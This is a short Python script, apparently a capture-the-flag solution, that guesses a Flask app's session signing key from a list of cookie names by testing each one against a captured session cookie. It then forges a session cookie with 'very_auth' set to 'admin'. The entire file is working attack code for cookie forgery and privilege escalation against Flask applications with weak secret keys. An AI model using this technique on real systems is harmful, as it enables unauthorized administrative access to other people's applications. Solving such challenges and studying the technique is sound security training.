import hashlib
from itsdangerous import URLSafeTimedSerializer
from itsdangerous.exc import BadTimeSignature
from flask.sessions import TaggedJSONSerializer
def flask_cookie(secret_key, cookie_str, operation):
    # This function is a simplified version of the SecureCookieSessionInterface: https://github.com/pallets/flask/blob/020331522be03389004e012e008ad7db81ef8116/src/flask/sessions.py#L304.
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    if operation == "decode":
        return s.loads(cookie_str)
    else:
        return s.dumps(cookie_str)

# The list of possible secret keys used by the app.
possible_keys = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

# An encoded cookie pulled from the live application that can be used to guess the secret key.
cookie_str = "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZNXrqw.YByuJkHA52JtRl5ov2Uj0ZPHTUE"

# For each possible key try to decode the cookie.
for possible_secret_key in possible_keys:
    try:
        cookie_decoded = flask_cookie(possible_secret_key, cookie_str, "decode")
    except BadTimeSignature:
        # If the decoding fails then try the next key.
        continue
    secret_key = possible_secret_key
    # Break the loop when we have the corret key.
    break

print("Secret Key: %s" % secret_key)

# The admin cookie has the `very_auth` value set to `admin`, which can be seen on line 46 of the server.py code.
admin_cookie = {"very_auth": "admin"}
# Encode the cookie used the `SecureCookieSessionInterface` logic.
admin_cookie_encoded = flask_cookie(secret_key, admin_cookie, "encode")

print("Admin Cookie: %s" % admin_cookie_encoded)